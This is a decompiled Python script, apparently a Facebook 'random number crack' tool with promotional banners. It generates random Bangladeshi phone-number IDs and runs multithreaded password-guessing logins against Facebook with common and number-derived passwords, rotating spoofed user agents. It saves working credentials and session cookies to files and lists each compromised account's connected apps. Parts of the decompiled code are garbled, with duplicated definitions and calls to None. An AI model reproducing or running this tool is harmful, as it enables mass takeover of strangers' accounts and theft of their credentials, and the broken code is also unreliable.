# Source Generated with Decompyle++
# File: test.pyc (Python 3.9)

import os
import sys
import time
import requests
import uuid

class jalan:
    
    def __init__(self, z):
        pass


logo3 = '   \n\x1b[1;32m       d8888 8888888b.  8888888 Y88b   d88P     d8888 888b    888   \n\x1b[1;35m       d88888 888   Y88b   888    Y88b d88P     d88888 8888b   888 .      \n\x1b[1;32m       d88P888 888    888   888     Y88o88P     d88P888 88888b  888   \n\x1b[1;32m       d88P 888 888   d88P   888      Y888P     d88P 888 888Y88b 888  \n\x1b[1;35m       d88P  888 8888888P"    888       888     d88P  888 888 Y88b888 \n\x1b[1;35m       d88P   888 888 T88b     888       888    d88P   888 888  Y88888 \n\x1b[1;32m       d88P     888 888   T88b 8888888     888  d88P     888 888    Y888   \n\n\x1b[1;37m━━━━━━━━━━━━━━ \x1b[32;45mKASHIF\x1b[0;m ━━━━━━━━━━━━━━━━━\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m━━━━━━━━━━━━━━ \x1b[32;45mARYAN\x1b[0;m ━━━━━━━━━━━━━━━━━\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m━━━━━━━━━━━━━━= \x1b[32;45mNIDA\x1b[0;m ━━━━━━━━━━━━━━━━━=\n'

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] FOLLOW ME ON FB')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/mamun.islam.lam.sex')
        FD()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] JOIN MY FACEBOOK PAGE')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/I.am.the.most.useless')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
    print("""\033[1;32m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
┃       \033[1;32mRANDOM NUMBER CRACK          ┃
\033[1;32m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘""")
    jalan('\x1b[1;32m [1]\x1b[1;33m ADVANCE RANDOM CRACK slow ')
    jalan('\x1b[1;32m [2]\x1b[1;33m NORMAL RANDOM CRACK ')
    jalan('\x1b[1;32m [3] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[4] \x1b[1;32mSUBSCRIBE MY CHANNEL')
    jalan(' \x1b[1;32m[5] \x1b[1;32mJOIN FB GROUP')
    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
        return None
    if opt == '2':
        i1()
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/mamun.islam.lam.sex')
        return None
    if opt == '3':
        os.system('xdg-open https://www.facebook.com/I.am.the.most.useless')
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[SAIMON] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[SAIMON] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/Saimonk189', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""   
\033[1;32m::::    ::::      :::     ::::    ::::  :::    ::: ::::    ::: 
\033[1;35m+:+:+: :+:+:+   :+: :+:   +:+:+: :+:+:+ :+:    :+: :+:+:   :+: 
\033[1;36m+:+ +:+:+ +:+  +:+   +:+  +:+ +:+:+ +:+ +:+    +:+ :+:+:+  +:+ 
\033[1;37m+#+  +:+  +#+ +#++:++#++: +#+  +:+  +#+ +#+    +:+ +#+ +:+ +#+ 
\033[1;31m+#+       +#+ +#+     +#+ +#+       +#+ +#+    +#+ +#+  +#+#+# 
\033[1;36m#+#       #+# #+#     #+# #+#       #+# #+#    #+# #+#   #+#+# 
\033[1;32m###       ### ###     ### ###       ###  ########  ###    ####  \x1b[0m
\033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;33m [✓] AUTHOR   : M4M7N
\033[1;34m [✓] GITHUB   : \033[41m\033[1;37mM4M7N\x1b[0m    
\033[1;35m [✓] Facebook :  Mamun Islam
\033[1;36m [✓] POWER  : \x1b[1;32m M4M7N\x1b[1;97m  
\033[1;32m [✓] UPDATE  : 1.1
\033[1;37m------------------------\033[1;37m------------------------""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2, ugen, redmi = [], [], []
for xd in range(10000):
	a='Mozilla/5.0; Profile/MIDP-2.1'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia5250'
	e=random.randrange(100, 9999)
	f='/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/525 3gpp-gba'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

	aa='Mozilla/5.0 (iPhone14,'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='U; CPU iPhone OS 15_4 like Mac OS X'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/602.1.50 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/19E241 Safari/602.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
#	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
#	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
#	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
#	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
#	pf = f'{A}{B}{C}{D}'
#	if pf in redmi:pass
#	else:redmi.append(pf)
#	A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
#	B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
#	C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
#	mi = f'{A}{B}{C}'
#	if mi in redmi:pass
#	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note '
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	E = f' Mobile Safari/537.36'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F)
	

    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
   
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m016, \033[1;33m017 ,\033[1;33m018 ,\033[1;33m019  ...\033[0;97m')
    jalan('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit Work Only 1 : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = ['bangladesh','iloveyou','i love you','@@##$$__&&','password']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            pro = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'web.facebook.com',
           "method": 'GET',
           "path": '/m.facebook.com',
           "scheme": 'https',
           "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
           "accept-encoding": 'gzip, deflate, br',
           "accept-language": 'en-US,en;q=1',
           'cache-control': 'no-cache, no-store, must-revalidate',
           "referer": 'https://web.facebook.com/',
           "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
           "sec-ch-ua-mobile": '?0',
           "sec-ch-ua-platform": "Windows",
           "sec-fetch-dest": 'document',
           "sec-fetch-mode": 'navigate',
           "sec-fetch-site": 'same-origin',
           "sec-fetch-user": '?1',
           "upgrade-insecure-requests": '1',
           "user-agent": pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(M4M7N-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/M4M7N-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(M4M7N-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        print (uid)
        sys.stdout.write('\r     %s[M4M7N] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
        
    except:
        pass
def i1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
   
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m016, \033[1;33m017 ,\033[1;33m018 ,\033[1;33m019  ...\033[0;97m')
    jalan('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Type 0 And Enter: "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[0:],love[1:],love[2:],code+love]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            pro = random.choice(redmi)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'web.facebook.com',
           "method": 'GET',
           "path": '/m.facebook.com',
           "scheme": 'https',
           "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
           "accept-encoding": 'gzip, deflate, br',
           "accept-language": 'en-US,en;q=1',
           'cache-control': 'no-cache, no-store, must-revalidate',
           "referer": 'https://web.facebook.com/',
           "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
           "sec-ch-ua-mobile": '?0',
           "sec-ch-ua-platform": "Windows",
           "sec-fetch-dest": 'document',
           "sec-fetch-mode": 'navigate',
           "sec-fetch-site": 'same-origin',
           "sec-fetch-user": '?1',
           "upgrade-insecure-requests": '1',
           "user-agent": pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(M4M7N-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/M4M7N-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(M4M7N-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/M4M7N-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[M4M7N] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

 
ud()
 
